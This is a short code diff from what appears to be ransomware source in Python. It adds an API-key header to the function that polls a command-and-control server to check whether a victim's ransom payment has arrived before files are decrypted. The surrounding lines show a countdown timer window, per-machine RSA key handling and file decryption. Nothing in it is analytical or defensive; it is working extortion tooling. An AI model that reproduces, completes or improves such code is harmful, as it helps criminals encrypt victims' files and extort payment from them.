@@ -8,7 +8,7 @@ import requests
 from datetime import datetime, timedelta
 from Decrypt import decrypt_all_files
 from RSA_Key_Handling import get_machine_identifier
-from Variables import script_files, seconds_left, password, timer_file_name, c2_server
+from Variables import script_files, seconds_left, password, timer_file_name, c2_server, api_key, wrong_api_key
 
 ####################################################################################################################
 
@@ -66,8 +66,11 @@ def timer_window():
 
     def check_payment_status():
         unique_id = get_machine_identifier()
+        headers = {
+        'API-KEY': api_key,
+        }
         try:
-            response = requests.get(c2_server + f"/payment_status/{unique_id}_private.pem")
+            response = requests.get(c2_server + f"/payment_status/{unique_id}_private.pem", headers=headers)
             if response.status_code == 200:
                 data = response.json()
                 paid = data.get('paid', False)
